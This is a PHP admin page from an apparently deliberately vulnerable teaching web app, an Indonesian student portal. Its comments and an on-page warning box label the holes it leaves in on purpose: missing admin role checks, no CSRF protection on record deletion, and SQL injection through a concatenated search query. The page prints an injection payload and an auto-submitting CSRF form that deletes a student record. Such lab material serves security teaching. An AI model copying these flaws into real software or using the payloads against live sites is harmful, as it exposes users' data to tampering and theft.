<?php
session_start();
require_once 'config.php';

// VULNERABILITY: Broken Access Control - Tidak ada pengecekan role admin!
// Seharusnya cek: if ($user['role'] !== 'admin') { die("Access Denied"); }

if (!isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
}

$conn = getConnection();

// Ambil semua mahasiswa
$mahasiswa_query = "SELECT * FROM mahasiswa ORDER BY id";
$mahasiswa_result = $conn->query($mahasiswa_query);
$all_mahasiswa = [];
while ($row = $mahasiswa_result->fetch_assoc()) {
    $all_mahasiswa[] = $row;
}

// VULNERABILITY: CSRF - Tidak ada CSRF protection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_mahasiswa'])) {
    $delete_id = (int)$_POST['mahasiswa_id'];
    
    // VULNERABILITY: Tidak ada konfirmasi atau validasi
    $delete_stmt = $conn->prepare("DELETE FROM mahasiswa WHERE id = ?");
    $delete_stmt->bind_param("i", $delete_id);
    $delete_stmt->execute();
    
    header('Location: admin.php?msg=deleted');
    exit;
}

// VULNERABILITY: SQL Injection via search (tidak menggunakan prepared statement)
$search = $_GET['search'] ?? '';
if ($search) {
    // VULNERABLE: Direct concatenation
    $search_query = "SELECT * FROM mahasiswa WHERE nama LIKE '%$search%' OR nim LIKE '%$search%' OR email LIKE '%$search%'";
    $mahasiswa_result = $conn->query($search_query);
    $all_mahasiswa = [];
    while ($row = $mahasiswa_result->fetch_assoc()) {
        $all_mahasiswa[] = $row;
    }
}

$conn->close();
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - DEL Portal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background: #f8f9fa;
        }
        .navbar {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .admin-header {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
        }
        .table-container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        .vulnerability-warning {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <a class="navbar-brand" href="dashboard.php">
                <i class="fas fa-shield-alt"></i> ADMIN PANEL
            </a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="dashboard.php">
                    <i class="fas fa-home"></i> Dashboard
                </a>
                <a class="nav-link" href="logout.php">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <?php if (isset($_GET['msg']) && $_GET['msg'] === 'deleted'): ?>
        <div class="alert alert-success">
            <i class="fas fa-check-circle"></i> Mahasiswa berhasil dihapus!
        </div>
        <?php endif; ?>

        <div class="admin-header">
            <h2><i class="fas fa-users-cog"></i> Admin Panel - Data Mahasiswa</h2>
            <p class="mb-0">Kelola data seluruh mahasiswa kampus</p>
        </div>

        <!-- Vulnerability Warnings -->
        <div class="vulnerability-warning">
            <h5><i class="fas fa-exclamation-triangle"></i> Kerentanan Keamanan yang Ada:</h5>
            <ul class="mb-0">
                <li><strong>Broken Access Control:</strong> Tidak ada validasi role admin - siapa saja yang login bisa akses!</li>
                <li><strong>CSRF:</strong> Tidak ada CSRF token pada form delete</li>
                <li><strong>SQL Injection:</strong> Search tidak menggunakan prepared statement</li>
                <li><strong>No Confirmation:</strong> Delete tanpa konfirmasi</li>
            </ul>
        </div>

        <!-- Search Form -->
        <div class="table-container mb-4">
            <form method="GET" class="row g-3">
                <div class="col-md-10">
                    <input type="text" class="form-control" name="search" placeholder="Cari mahasiswa (nama, NIM, email)..." value="<?= htmlspecialchars($search) ?>">
                    <small class="text-danger">⚠️ SQL Injection: Coba input: <code>' OR '1'='1</code></small>
                </div>
                <div class="col-md-2">
                    <button type="submit" class="btn btn-primary w-100">
                        <i class="fas fa-search"></i> Cari
                    </button>
                </div>
            </form>
        </div>

        <!-- Data Table -->
        <div class="table-container">
            <h4 class="mb-4">Daftar Mahasiswa</h4>
            <div class="table-responsive">
                <table class="table table-hover">
                    <thead class="table-dark">
                        <tr>
                            <th>ID</th>
                            <th>NIM</th>
                            <th>Nama</th>
                            <th>Email</th>
                            <th>Prodi</th>
                            <th>IPK</th>
                            <th>Role</th>
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($all_mahasiswa as $mhs): ?>
                        <tr>
                            <td><?= $mhs['id'] ?></td>
                            <td><?= htmlspecialchars($mhs['nim']) ?></td>
                            <td><?= htmlspecialchars($mhs['nama']) ?></td>
                            <td><?= htmlspecialchars($mhs['email']) ?></td>
                            <td><?= htmlspecialchars($mhs['prodi']) ?></td>
                            <td><?= number_format($mhs['ipk'], 2) ?></td>
                            <td>
                                <span class="badge bg-<?= $mhs['role'] === 'admin' ? 'danger' : 'primary' ?>">
                                    <?= $mhs['role'] ?>
                                </span>
                            </td>
                            <td>
                                <a href="khs.php?id=<?= $mhs['id'] ?>" class="btn btn-sm btn-info">
                                    <i class="fas fa-eye"></i>
                                </a>
                                <form method="POST" class="d-inline">
                                    <input type="hidden" name="mahasiswa_id" value="<?= $mhs['id'] ?>">
                                    <button type="submit" name="delete_mahasiswa" class="btn btn-sm btn-danger">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </form>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- CSRF Attack Demo -->
        <div class="table-container mt-4">
            <h5 class="text-danger"><i class="fas fa-bug"></i> CSRF Attack Demo</h5>
            <p>Buat file HTML external dengan code berikut untuk melakukan CSRF attack:</p>
            <pre class="bg-dark text-light p-3 rounded"><code>&lt;form method="POST" action="http://localhost:8000/admin.php"&gt;
    &lt;input type="hidden" name="delete_mahasiswa" value="1"&gt;
    &lt;input type="hidden" name="mahasiswa_id" value="1"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
